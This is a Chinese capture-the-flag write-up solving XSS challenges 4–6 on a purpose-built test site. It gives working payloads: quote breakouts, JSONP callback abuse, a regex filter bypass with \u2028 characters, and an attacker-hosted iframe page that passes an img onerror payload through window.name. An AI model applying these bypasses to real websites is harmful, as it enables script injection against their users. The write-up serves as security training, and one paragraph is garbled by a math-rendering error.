<p>老老实实构造一个if语句的poc：<code>http://px1624.sinaapp.com/test/xsstest4/?px=%27;反引号;if(1){alert(%27</code>(由于MARKDOWN会吞反引号，用中文代替)</p>
<pre><code class="language-js">    $(function test() {
		var px = '';`;if(1){alert('';
		if (px != &quot;&quot;) {
			$('xss').val('';`;if(1){alert('');
		}
	})
</code></pre>
<p>然后开始利用浏览器特性开始偷，就是慢慢删、不报错就可以，writeup1：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest4/?px=%27;反引号;{alert(%27</code>（13个字符gainover解法）</p>
<p>由于当前有JQuery环境，还可以利用之前提到的<code>$(alert(1))</code>来弹框，writeup2：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest4/?px=%27;反引号;{$(alert(1),%27</code></p>
<h3 id="运算符进阶更多的运算符">运算符进阶：更多的运算符</h3>
<p>之前分析看似不行的道路实际上都还有骚操作，深刻教训：<strong>查文档请查<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference">开发者文档</a></strong></p>
<p>除了我们知道的一些常见的运算符号，还有一些少用的运算符比如<code>in</code>、<code>instanceof</code>。</p>
<p><code>'' in alert(1)</code>在漏洞构造的时候 虽然由于数据类型不正确，执行会不成功，但是语法是正确的，同时由于先执行alert(1)函数，然后再处理关系运行符的执行顺序，可以正确执行弹框语句。</p>
<p><code>'in alert(1) in'</code>writeup：<code>http://px1624.sinaapp.com/test/xsstest4/?px=%27in%20alert(1)%20in%27</code></p>
<pre><code class="language-js">    $(function test() {
		var px = ''in alert(1) in'';
		if (px != &quot;&quot;) {
			$('xss').val(''in alert(1) in'');
		}
	})
</code></pre>
<p>罗列个运算符标识符清单：</p>
<pre><code class="language-js">in
instanceof
&lt;
&gt;
&amp;
|
^
+
-
/
*
%
delete
void
typeof
~
!
</code></pre>
<h2 id="第五题">第五题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest5/</p>
<p>知识点：</p>
<ul>
<li>script标签的src</li>
<li>js基本函数</li>
</ul>
<p>访问后会发现地址栏直接传到：http://px1624.sinaapp.com/test/xsstest5/user.php?callback=Give%20me%20xss%20bypass~</p>
<p>在这个页面测试，callback参数无论输入什么都会返回对应的内容，可以写入alert之类的弹框语句，但是这边并不会构成xss。</p>
<p>因为返回的内容体是<code>Content-Type: text/javascript</code>，这个内容类型跟<code>application/json</code>之类的类似，都是不会被浏览器按照html解析的。所以一定什么地方我们有疏漏。</p>
<p>我们清空浏览器缓存，抓取数据包的的话会发现实际上这里会有一个跳转行为，访问<code>view-source:http://px1624.sinaapp.com/test/xsstest5/</code>可以查看默认页面的js源码逻辑。</p>
<pre><code class="language-html">
&lt;html&gt;
&lt;script src=&quot;../jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;
&lt;Script src=&quot;./index.js&quot;&gt;&lt;/Script&gt;
&lt;head&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
var orguin = $.Tjs_Get('uin');
var pagenum= $.Tjs_Get('pn');
if(orguin&lt;=0) window.location=&quot;./user.php?callback=Give me xss bypass~&quot;;
document.write('&lt;script type=&quot;text/javascript&quot; 	src=&quot;http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'&quot;&gt;&lt;\/script&gt;');
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
Give me xss bypass 5~
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ol>
<li>
<p>引入了一个index.js作为库函数使用，<code>$.Tjs_Get</code>正是其中的方法（会解析出对应GET参数），我们可以到内部去看其逻辑，之后分析。</p>
</li>
<li>
<p>如果orguin的内容小于=0 就会跳转（就是我们直接访问默认跳转的情况）</p>
<p>不然的话会向当前页面写入一个script标签，其内容是当前网站的某个页面的内容（我们可以控制相对路径和参数）</p>
</li>
</ol>
<p>比较明显，我们的目标就是传入<code>uin参数</code>和<code>pn参数</code>，绕过跳转，再利用<code>document.write</code>来引入一个存在payload的页面。作为script解析执行。</p>
<p>先来看看我们传入的参数收到了怎么样的解析，XSS总是逃不过看关键JS的命运，这里不看之后就看不懂了：</p>
<pre><code class="language-js">Tjs_Get:function(parmtname){
    //在url地址中找到&amp;和#的位置
    var sl = location.href.indexOf('&amp;');
    var hl = location.href.indexOf('#');
    var str = '';
    //没有&amp;参数分割字符并且有#锚点字符，或者&amp;字符在锚点#之后并且有#锚点字符
    //就开始解析#锚点之后的参数
    if ((sl &lt; 0 || sl &gt; hl) &amp;&amp; hl &gt; 0) str = location.hash.substr(1);
    //否则解析get参数
    else str = location.search.substr(1);
    //waf1：过滤%，置换为空
    str=str.replace(/%/g,&quot;&quot;);
    //清空包括?之前的字符，做一个html编码，waf2
    var SERVER_TEMP			= $.Tjs_HtmlEncode(str.replace(/.*\?/,&quot;&quot;)); //HtmlEncode 进行安全验证
    //get参数按照&amp;分割，读取参数名跟我们输出的参数名比对
    //如果一样就获取值
    var PAGE_PARMT_ARRAY	= SERVER_TEMP.split(&quot;&amp;amp;&quot;);
    if(PAGE_PARMT_ARRAY.length==0) return &quot;&quot;;
    var value=&quot;&quot;;
    for(var i=0;i&lt;PAGE_PARMT_ARRAY.length;i++){
        if(PAGE_PARMT_ARRAY[i]==&quot;&quot;) continue;
        var GETname = PAGE_PARMT_ARRAY[i].substr(0,PAGE_PARMT_ARRAY[i].indexOf(&quot;=&quot;));
        if(GETname == parmtname){
            value = PAGE_PARMT_ARRAY[i].substr((PAGE_PARMT_ARRAY[i].indexOf(&quot;=&quot;)+1),PAGE_PARMT_ARRAY[i].length);
            return value;
            break;
        }
    }
    return &quot;&quot;;
},
</code></pre>
<ol>
<li>分情况解析**?之后的参数<strong>或者是</strong>#之后的参数**</li>
<li><code>%</code>被过滤，替换为空</li>
<li>包括<code>?</code>之前的字符会被清空不被解析（经过测试为贪婪匹配即最后一个?为准）</li>
<li>假如出现两个相同的参数名的参数，根据实现逻辑会取第一个的值</li>
</ol>
<p>简单瞅一下自实现的js加密<code>Tjs_HtmlEncode</code>:正常的html编码</p>
<pre><code class="language-js">Tjs_HtmlEncode:function (sStr)
{
    sStr = sStr.replace(/&amp;/g,&quot;&amp;amp;&quot;);
    sStr = sStr.replace(/&gt;/g,&quot;&amp;gt;&quot;);
    sStr = sStr.replace(/&lt;/g,&quot;&amp;lt;&quot;);
    sStr = sStr.replace(/&quot;/g,&quot;&amp;quot;&quot;);
    sStr = sStr.replace(/'/g,&quot;&amp;#39;&quot;);
    return sStr;
},
</code></pre>
<p>看完之后我们大致就可以清楚为什么我们直接访问会进行跳转：我们没有传入uin参数，那么获取到的orguin就是<code>&quot;&quot;</code>，在js中<code>&quot;&quot;==0</code>成立，满足<code>&quot;&quot;&lt;=0</code>，于是跳转。</p>
<p>那么第一步我们需要让他不跳转，来进行js调试，根据原理访问<code>http://px1624.sinaapp.com/test/xsstest5/?uin=123</code>即可。而<code>http://px1624.sinaapp.com/test/xsstest5/?uin=123#</code>就不行，根据解析规则，他会去截取#之后的字符去解析。</p>
<p>回归payload触发，我们要在script标签中引入一个带有js的页面，我第一反应是直接引入之前题目成功弹框的页面，比如test4：<code>http://px1624.sinaapp.com/test/xsstest4/?px=%27;反引号;{alert(%27</code></p>
<pre><code class="language-js">document.write('&lt;script type=&quot;text/javascript&quot; 	src=&quot;http://px1624.sinaapp.com/'+orguin+'?'+pagenum+'&quot;&gt;&lt;\/script&gt;');
</code></pre>
<p>按照对应的拼接规则来构造payload：<code>http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest4/&amp;pn=px=%27;反引号;{alert(%27*</code>。然后就发现不行，原因有二：</p>
<ul>
<li>根本思路错误：在本地测试直接利用script标签在src引入test4的带有js的页面也不会成功弹框，因为test4弹框的页面不单单只有js代码，还有html代码，都引入到script标签中当作JS解析会解析错误。</li>
<li>我们构造的payload被破坏：根据js解析规则我们构造的payload其中的%会被吃掉。</li>
</ul>
<p>更换思路，我们不能指定的页面不能带有html标签，而是要在对方服务器上找到一个仅仅存在js payload的页面，来引入执行。（根据题目中的url拼接规律是不可以引入其他域名的页面的，只有这种方法可以）</p>
<p>想到之前我们默认访问跳转的页面，我们给啥他返回啥，但是由于内容头不解析的<strong>user.php</strong>，通过callback指定返回内容：</p>
<p>http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)</p>
<p>根据拼接规则构造payload，会发现这种思路构造的payload恰好绕过了Tjs_Get的两个waf过滤：既没有%，也没有被编码的关键词，只需要按照处理规则拼接即可：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest5/?uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</code></p>
<p>当然根据js代码中获取<code>Tjs_Get</code>不同的规则，还可以获取锚点中的参数，对应writeup：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest5/#uin=test/xsstest5/user.php&amp;pn=callback=alert(1)</code></p>
<h2 id="第六题">第六题</h2>
<p>题目：http://px1624.sinaapp.com/test/xsstest6/</p>
<pre><code class="language-js">&lt;html&gt;
&lt;script src=&quot;../jquery-3.4.1.min.js&quot;&gt;&lt;/script&gt;
&lt;Script src=&quot;./index.js&quot;&gt;&lt;/Script&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
var orguin = $.Tjs_Get('uin');
if(orguin&lt;=0) window.location=&quot;./user.php?callback=&quot;;
document.write('&lt;script type=&quot;text/javascript&quot; 	src=&quot;http://px1624.sinaapp.com/pxpath/'+decodeURIComponent(orguin)+'&amp;'+Math.random()+'&quot;&gt;&lt;\/script&gt;');
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
Give me xss bypass 6~【任意浏览器弹1就算通过】
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p><strong>知识点</strong>：</p>
<ul>
<li>正则表达式<code>.</code>匹配范畴</li>
<li>浏览器处理字符集的情况（直接URL访问与通过字符串跳转）</li>
<li>JS正则匹配的匹配逻辑</li>
<li>window.name跨域传输参数</li>
<li>延续第二题分析的JQuery DOM XSS的特性</li>
</ul>
<p>这是很复杂的一题，按照出题者说是最难的一题。</p>
<p>跟第五题看上去区别不大，index.js中的内容也没有变化，其他有三处变化：</p>
<ul>
<li>之前2处参数前端参数输入自动用? 连接的script标签拼接处，变为了 一处参数插入，之后加了个应该没用&amp;和随机数</li>
<li>输入的参数用了decodeURLComponent解密后拼接</li>
<li>进入了一个<code>/pxpath/</code>的不存在的子目录，看样子需要<code>../</code>去回到上层目录才行</li>
</ul>
<p>回顾之前的<strong>Tjs_Get</strong>解析分析的结果：</p>
<ol>
<li>分情况解析?之后的参数或者是#之后的参数</li>
<li>waf1：<code>%</code>被过滤为空</li>
<li>waf2：包括<code>?</code>本身之前的字符会被清空不被解析（经过测试为贪婪匹配即最后一个?为准）</li>
<li>假如出现两个相同的参数名的参数，根据实现逻辑会取第一个的值</li>
</ol>
<p>这里尝试跟上一题一样构建payload的话就会发现我们必须跟<code>%</code>、<code>?</code>这两个waf杠上，因为我们引入的script标签src来源payload所在地：<code>http://px1624.sinaapp.com/test/xsstest5/user.php?callback=alert(1)</code>就是有一个<code>?</code>。</p>
<p>按照waf2规则，如果我们使用<code>?</code>，之前的内容就会被丢弃；如果尝试对<code>?</code>进行url编码（因为最后拼接前有一个decodeURLComponent url解码，可以恢复出我们的<code>?</code>）就会因为在读取参数的时候<code>%</code>被删掉而失败。</p>
<p>那么只有两个思路：</p>
<ol>
<li>仍然使用user.php?callback的payload触发页面，然后想办法硬肛WAF来绕过</li>
<li>使用一个没有？的payload触发页面</li>
</ol>
<p>由于域名的限定，当前域名没有符合第二个思路的条件：于是使用一个没有？的payload触发页面的思路，就PASS。</p>
<p>还是来硬肛WAF，两个WAF都是由正则匹配的：</p>
<ul>
<li><code>str.replace(/%/g,&quot;&quot;);</code></li>
<li><code>str.replace(/.*\?/,&quot;&quot;)</code></li>
</ul>
<p>前者加上了g修饰符完成全局匹配<code>%</code>，确实没法绕过；看后者实现的逻辑为：**0个或多个除了换行符以外的字符再加上一个？**会被替换为空。</p>
<ul>
<li><code>.</code>：除了换行符以外的字符</li>
<li><code>*</code>：一次或多次</li>
<li><code>\?</code>：一个?字符</li>
</ul>
<p>可以注意到他只匹配<strong>除换行符以外的字符</strong>加一个问号，那么<strong>插入一个换行符</strong>是不是就可以破坏他的匹配规则？</p>
<p>先给出两种不考虑waf情况的理论poc（js中的参数形式与锚点形式）：</p>
<pre><code class="language-js">参数形式：&quot;http://px1624.sinaapp.com/test/xsstest6/?uin=../test/xsstest5/user.php?callback=alert(1)&quot;
//在js处理中会取location.search.substr(1),即：
uin=../test/xsstest5/user.php?callback=alert(1)
锚点形式：&quot;http://px1624.sinaapp.com/test/xsstest6/#uin=../test/xsstest5/user.php?callback=alert(1)&quot;
//在js处理中会取location.hash.substr(1),即：
uin=../test/xsstest5/user.php?callback=alert(1)
//script标签的引入地址都是：
&quot;http://px1624.sinaapp.com/pxpath/../test/xsstest5/user.php?callback=alert(1)&quot;
</code></pre>
<p>可以抽象进入<code>str.replace(/.*\?/,&quot;&quot;)</code>的str目前为<code>123?456</code>的格式，并且这个<code>123?456</code>是不能被删掉的全都要的数据。</p>
<p>我们知道常见的换行符有<code>/r、/n</code>，我们来到到谷歌浏览器命令行试验一下：</p>
<pre><code class="language-js">&quot;123?456&quot;.replace(/.*\?/,&quot;&quot;)
//&quot;456&quot; (匹配到了&quot;123?&quot;)
&quot;123\r?456&quot;.replace(/.*\?/,&quot;&quot;)
//&quot;123456&quot; (匹配到了&quot;?&quot;,123\456中间有一个看不见的/r)
//可以发现利用换行符的确可以截断
//由于我们是要一个?的，但是肯定会被匹配死掉一个，需要引入一个替死鬼
&quot;?123\r?456&quot;.replace(/.*\?/,&quot;&quot;)
//&quot;123?456&quot; (匹配到了第一个&quot;?&quot;，中间有一个看不见的/r)
//这里涉及到为哈不匹配第二个&quot;?&quot;呢，因为他们都满足条件正则条件
//这种情况在JS中就会匹配第一个符合条件的。
</code></pre>
<p>来带入到具体数据：</p>
<pre><code class="language-js">uin=../test/xsstest5/user.php?callback=alert(1)
//加上我们说的开头的替死鬼?
?uin=../test/xsstest5/user.php?callback=alert(1)
</code></pre>
<p>再来确定换行符应该放的位置，我们会发现好像不是能够随便放置的：</p>
<pre><code class="language-js">?\ruin=../test/xsstest5/user.php?callback=alert(1)
//不行，这样的话会改变参数名称导致之后解析获取不到uin
?uin=\r../test/xsstest5/user.php?callback=alert(1)
//不行，目录跳转的上层目录应该会解析出错
</code></pre>
<p>根据<strong>参数解析规则</strong>和<strong>目录跳转特征</strong>，我们会得出两种理论可能可行的方案：</p>
<ul>
<li>
<p>作为一个不使用的参数：<code>?\r&amp;uin=../test/xsstest5/user.php?callback=alert(1)</code></p>
</li>
<li>
<p>作为一个子目录再跳上来：<code>?uin=\r/../../test/xsstest5/user.php?callback=alert(1)</code></p>
</li>
</ul>
<p>很好，然后构造出2种最后的理论可行完整payload地址：</p>
<p><code>http://px1624.sinaapp.com/test/xsstest6/??\r&amp;uin=../test/xsstest5/user.php?callback=alert(1)</code></p>
<p><code>http://px1624.sinaapp.com/test/xsstest6/??uin=\r/../../test/xsstest5/user.php?callback=alert(1)</code></p>
<blockquote>
<p>可以看到有2个？</p>
<p>第一个？会被location.search.substr(1)吞掉，第二个？是为了被正则匹配吃掉的替死鬼</p>
<p>第一个？换成#就是换成了锚点读取参数的方式，即再js逻辑中location.search -&gt; location.hash</p>
</blockquote>
<p>丢谷歌浏览器地址栏去尝试，会发现GG，在index.js中下断点发现<code>\r</code>会被当作是普通字符串解析。</p>
<figure data-type="image" tabindex="2"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui4s4ripj32240y7dpp.jpg" alt="r的失败.png" loading="lazy"></figure>
<p>这将导致我们一切推导的前提：<strong>换行符能够破坏<code>/.*\?/</code>的正则匹配</strong>被抽空掉。</p>
<ol>
<li>编码补救？在地址栏的编码中能使用URL式的编码，会产生无法绕过的WAF1拦截的<code>%</code>，不行</li>
<li>尝试使用控制台解析跳转：location=url地址。（因为我们之前测试在控制台中是可以解析的，这样既可以完成字符解析又可以完成在地址栏中输入一样跳转地址的效果）（ps.当然这种骚操作的引入在利用场景上就会离简单的XSS利用—点击恶意连接利用不一样了，之后会说明）</li>
</ol>
<p>题目提示任意浏览器均可肯定有的不行，控制台分别都试下：<code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??\r&amp;uin=../test/xsstest5/user.php?callback=alert(1)&quot;</code></p>
<p>在谷歌和火狐浏览器中会被直接吞掉：</p>
<figure data-type="image" tabindex="3"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui54tandj31xj0r6ahz.jpg" alt="location-r的失败.png" loading="lazy"></figure>
<p>在IE浏览器会正常解析<code>\r</code>，然后吞掉：</p>
<figure data-type="image" tabindex="4"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui5ck27wj30o809uq41.jpg" alt="IE-location-r的失败.png" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui5l4zeuj320t0npn1u.jpg" alt="IE-location-r的失败2.png" loading="lazy"></figure>
<p>不得行。换行符换行符，那就换个换行符<code>\n</code>？肯定还是一样的局面。</p>
<h3 id="正则-不匹配的字符到底有啥">正则 . 不匹配的字符到底有啥</h3>
<p>看到这里<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions">字符集的参考文档</a>:</p>
<figure data-type="image" tabindex="6"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui5yn1nhj31kn0hg77q.jpg" alt="换行符字符集.png" loading="lazy"></figure>
<p>结合<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions">正则的参考文档</a>:</p>
<figure data-type="image" tabindex="7"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui6319gwj31py09oq5d.jpg" alt="换行符字符集2.png" loading="lazy"></figure>
<p>使用<code>&quot;123?\u2028456?&quot;.replace(/.*\?/,&quot;&quot;)</code>进行一个个测试：</p>
<p>发现<code>\n、\r、\u2028、\u2029</code>可以拦截<code>.</code>的匹配（ps.空白字符串没有给到惊喜....）</p>
<p>那么\r、\n不行，试试**\u2028<strong>和</strong>\u2029**</p>
<p>取IE为例（因为要是浏览器有问题一般肯定是IE有问题，Edge也可），地址栏中直接<code>http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest5/user.php?callback=alert(1)</code>理所应当还是会被作为字符串。</p>
<figure data-type="image" tabindex="8"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui6bv6gzj321i0t2djw.jpg" alt="IE-地址栏-2028.png" loading="lazy"></figure>
<p>控制台执行location呢：<code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest5/user.php?callback=alert(1)&quot;</code></p>
<figure data-type="image" tabindex="9"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui78qkc6j31rt0loq74.jpg" alt="IE-location-2028.png" loading="lazy"></figure>
<figure data-type="image" tabindex="10"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui7c833dj31gv0ic0t0.jpg" alt="IE-location-2028-success.png" loading="lazy"></figure>
<p>完美解析弹框。我们的/u2028被解析成了一个字符传入。</p>
<p>来看看其他浏览器，比如火狐，我们的/u2028会被解析成URL形式，然后被WAF1干掉%，谷歌也是一样的，GG：</p>
<figure data-type="image" tabindex="11"><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui7i4tp4j31w00vrwma.jpg" alt="火狐-false-2028.png" loading="lazy"></figure>
<p>此外，这边之前说到的<strong>当作子目录形式</strong>的payload也是可以的：</p>
<p><code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??uin=\u2028/../../test/xsstest5/user.php?callback=alert(1)&quot;</code></p>
<p>所以2种最后writeup：</p>
<p><code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest5/user.php?callback=alert(1)&quot;</code></p>
<p><code>location=&quot;http://px1624.sinaapp.com/test/xsstest6/??uin=\u2028/../../test/xsstest5/user.php?callback=alert(1)&quot;</code></p>
<ul>
<li>第一个<code>?</code>可以替换为<code>#</code>，变为锚点形式的取参</li>
<li>\u2028 可以换成 \u2029</li>
</ul>
<h3 id="test6作为触发器-">test6作为触发器-$()</h3>
<p>其实以上payload都使用了上一题的**/xsstest5/user.php**作为payload触发。</p>
<p>如果要用<strong>xsstest6/user.php</strong>作为触发器又会有另外一个问题：<strong>这个xsstest6的页面callback参数多了另一个限制：限制值得长度小于等于7个字符</strong></p>
<p>即：只能写alert()，不能写alert(1)，但是题目要求就是弹框1</p>
<p>我们要想办法弄一个短一点的弹框payload。</p>
<p>在这之前我们要梳理一下之前没详细说明的第六题location的攻击场景：使用location=payload的形式，并不是说真的要让受害者去命令行中执行这一js代码去触发弹框。（虽然我们是这么演示的）而是攻击者会构筑一个网站，在其中写入自定义js代码，执行location跳转触发弹框，流程如下：</p>
<ul>
<li>受害者点击攻击者自定义网站域名</li>
<li>跳转至漏洞网站，完成攻击</li>
</ul>
<p>比如之前的payload，可以形成这样一个test.html：</p>
<pre><code class="language-html">&lt;script&gt;
    location=&quot;http://px1624.sinaapp.com/test/xsstest6/??uin=\u2028/../../test/xsstest5/user.php?callback=alert(1)&quot;
&lt;/script&gt;
</code></pre>
<p>然后用Edge打开页面（模拟受害者访问攻击者服务器页面）就可以自动跳转触发。</p>
<p>回到使用xsstest6的触发点：缩短弹框函数</p>
<p>其实利用原理**JQuery <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>(</mo><mo>)</mo><mi>D</mi><mi>O</mi><mi>M</mi><mi>X</mi><mi>S</mi><mi>S</mi><mi mathvariant="normal">特</mi><mi mathvariant="normal">性</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">在</mi><mi mathvariant="normal">第</mi><mi mathvariant="normal">二</mi><mi mathvariant="normal">题</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">已</mi><mi mathvariant="normal">经</mi><mi mathvariant="normal">详</mi><mi mathvariant="normal">细</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">析</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">() DOM XSS特性**在第二题中已经详细的分析了，就是`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mclose">)</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">性</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">第</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">题</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">已</span><span class="mord cjk_fallback">经</span><span class="mord cjk_fallback">详</span><span class="mord cjk_fallback">细</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">析</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord">‘</span></span></span></span>(&quot;<img src=x onerror=alert(1)>&quot;)`可以作为alert(1)的弹框替代，但是这么长一串反而超长了。</p>
<p>我们只要把img标签设置成一个变量就可以达到缩短长度的目的。</p>
<pre><code class="language-js">var a=&quot;&lt;img src=x onerror=alert(1)&gt;&quot;
$(a)
//弹框
</code></pre>
<p>理想中是想构建一个payload如下：</p>
<pre><code class="language-html">&lt;script&gt;
	var a=&quot;&lt;img src=x onerror=alert(1)&gt;&quot;
    location=&quot;http://px1624.sinaapp.com/test/xsstest6/??uin=\u2028/../../test/xsstest5/user.php?callback=$(a)&quot;
&lt;/script&gt;
</code></pre>
<p>不用试就知道显而易见不可以，因为location会进行跳转，跳转过去的页面，在处理时，我们的a参数是肯定不会传递过去的，JS解析$(a)，找不到变量a，肯定报错。</p>
<p>整理一下：我们的callback参数的内容：是一段我们可控的、会在px1624.sinaapp.com域下进行执行的js代码。其长度不能超过7个字符。</p>
<p>我们想到<code>$(a)</code>，4个字符的弹框方式，但是px1624.sinaapp.com/test/xsstest6/这个页面下的js环境中又没有我们要的a：<code>&quot;&lt;img src=x onerror=alert(1)&gt;&quot;</code></p>
<p>这就明确了目标：</p>
<ol>
<li>我们需要往px1624.sinaapp.com域下传入一个a。</li>
<li>然后通过callback后面的js执行<code>$(a)</code>这个参数。</li>
<li>跨域</li>
</ol>
<p>于是<strong>windows.name跨域传输参数</strong></p>
<h4 id="iframe的windowname跨域传输">iframe的window.name跨域传输</h4>
<blockquote>
<p>感谢Huuu师父忍受了憨批错误的骚扰和指出了此处的技术原理</p>
</blockquote>
<p>iframe内外，可以通过window.name进行传输参数，<a href="https://developer.aliyun.com/article/293802">参考</a>，此处举个例子</p>
<p><code>iframe-a.html</code>：引入iframe-b.html页面</p>
<pre><code class="language-html">&lt;iframe id=&quot;lala&quot; name=&quot;**from-a-name**&quot; src=&quot;./iframe-b.html&quot;&gt;&lt;/iframe&gt;
</code></pre>
<p><code>iframe-b.html</code>：</p>
<pre><code class="language-html">&lt;script&gt;
    console.log(&quot;b-name-output:&quot;+name)
    console.log(&quot;b-window.name-output:&quot;+window.name)

    name=&quot;b-name-change&quot;
    // window.name=&quot;b-windows-name-change&quot;（上下两句等价）
    console.log(&quot;change-b-name-output:&quot;+name)
    console.log(&quot;change-b-window.name-output:&quot;+window.name)
&lt;/script&gt;
</code></pre>
<p>结果：</p>
<pre><code class="language-JS">b-name-output:**from-a-name**
b-window.name-output:**from-a-name**
change-b-name-output:b-name-change
change-b-window.name-output:b-name-change
//输出
document.getElementById('lala').name
&quot;**from-a-name**&quot;
document.getElementById('lala').contentWindow.name
&quot;b-name-change&quot;
</code></pre>
<p>由于我们打开的是A页面，通过document获取iframe参数，然后输出查看值：</p>
<ul>
<li>第一个是直接获取父页面A的name，它是不会随着B页面的设定而修改的</li>
<li>第二个是获取父页面A的iframe中windows的name，它可以在子页面B中设定</li>
<li>在子页面中设定name和window.name等价。</li>
</ul>
<p>可以见的：</p>
<ul>
<li>父页面A可以通过 设置iframe的name属性 向子页面B传输数据，并且被在子页面中使用<strong>name</strong>/<strong>window.name</strong>获取到</li>
<li>子页面B可以通过 设置window.name/name向父页面A传输数据，并且在父页面中使用<strong>节点.contentWindow.name</strong>获取到</li>
</ul>
<blockquote>
<p>如果只是放在桌面上打开，而本地不起web服务放入这两个文件再访问，会爆这个错误：<a href="https://blog.csdn.net/qq_35603476/article/details/100918772">Blocked a frame with origin &quot;null&quot; from accessing a cross-origin frame.</a></p>
</blockquote>
<p>那么至此就很明显了：弄一个iframe，在name里传入我们的payload，然后$()它即可。</p>
<p>当然在callback值中由于长度问题，不能使用<code>$(window.name)</code>，使用<code>$(name)</code>长度刚好，writeup：</p>
<pre><code class="language-html">&lt;iframe id=&quot;lala&quot; name=&quot;&lt;img src=x onerror=alert(1)&gt;&quot; src=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;script&gt;
    document.getElementById(&quot;lala&quot;).src=&quot;http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest6/user.php?callback=$(name)&quot;
&lt;/script&gt;
</code></pre>
<p>使用Edge、或者IE打开均可。</p>
<h4 id="拷问">拷问</h4>
<p>在和px1642大哥提到题目的时候，被指着文章进行无情的鞭挞QAQ，由于做了挺久了，问了几个问题一个都回答不好，害。</p>
<ol>
<li><strong>为什么如上payload中，iframe标签的name属性由<code>&lt;img src=x onerror=alert(1)&gt;</code>修改为<code>alert(1)</code>不可以弹框呢？</strong></li>
</ol>
<p>其实题目的最终是将callback后面的参数值作为JS解析执行。修改了name，最终执行的JS就为：<code>$(&quot;alert(1)&quot;)</code></p>
<p>在第二题中详细分析过JQuery的DOM XSS特性，是由于DOM操作插入标签引起的。但是当时一开始迷惑于，测试<code>$(alert(1))</code>是可以弹框的，那为什么通过name拆开了alert(1)就不可以弹框了呢，死活想不通。</p>
<p>实际上<code>$(alert(1))</code>和<code>$(&quot;alert(1)&quot;)</code>完全不是一回事情，前者弹框是由于先进行表达式计算，后进入$()，才弹框的。后者这种形式本来就不能执行。</p>
<ol start="2">
<li><strong>为什么如下payload，不可以弹框呢</strong></li>
</ol>
<pre><code class="language-html">&lt;iframe id=&quot;lala&quot; name=&quot;javascript:alert(1)&quot; src=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;script&gt;
    document.getElementById(&quot;lala&quot;).src=&quot;http://px1624.sinaapp.com/test/xsstest6/??\u2028&amp;uin=../test/xsstest6/user.php?callback=name&quot;
&lt;/script&gt;
</code></pre>
<p>其实这里就是把各种东西杂揉了进来，看起来好像很有道理，但是根本不沾边。</p>
<p>回归题目最终是将callback后面的参数值作为JS解析执行：</p>
<pre><code class="language-js">name=&quot;javascript:alert(1)&quot;;
name;
</code></pre>
<p>只不过区区变量而已，当然不弹框。</p>
<ol start="3">
